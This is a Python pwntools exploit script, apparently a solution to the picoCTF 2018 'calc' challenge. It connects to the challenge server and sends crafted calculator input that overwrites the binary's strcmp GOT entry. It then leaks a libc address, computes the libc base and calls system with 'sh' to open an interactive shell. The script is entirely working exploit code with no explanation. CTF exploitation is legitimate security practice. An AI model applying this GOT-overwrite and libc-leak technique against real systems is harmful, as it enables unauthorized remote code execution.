from pwn import *

target = ELF('./calc')
libc = ELF('./libc.so.6')

# r = process('./calc')
r = remote('2018shell1.picoctf.com', 54291)

payload = ''
payload += ': a 1 : b 9 # # # # # # # # : c 1 : d 1 # '
payload += 'a ' * 2
payload += '\x09 '	# originally b
payload += str(target.symbols['pop']) + ' '		# to avoid SIGSEGV
payload += '0 ' * 5
payload += str(target.symbols['push']) + ' '	# to avoid SIGSEGV
payload += '7 '
payload += 'c ' * 2
payload += '4199698 '	# address of "%zu"
payload += '%zu '
payload += '= ' * 9
payload += ': e 10 # # # # # # # # # # '
payload += ': f 9 # # # # # # # # ' + str(target.got['strcmp'] - 0x8) + ' '
payload += ': ' + 'g' * 0x80 + '\x37\x15\x40 0 '	# address of "%ld"
payload += str(target.symbols['pop']) + ' '		# to avoid SIGSEGV
payload += '0 ' * 3

r.sendlineafter('>> ', payload)

r.recvuntil('Invalid operation ')

LIBC_BASE = int(r.recvline().strip()[1:-1]) - 0x3c4b78

payload = ''
payload += '= ' * 3
payload += ': %ld 1 ' + str(LIBC_BASE + libc.symbols['system']) + ' '
payload += 'sh'

r.sendlineafter('>> ', payload)

r.recvlines(3)
r.interactive()
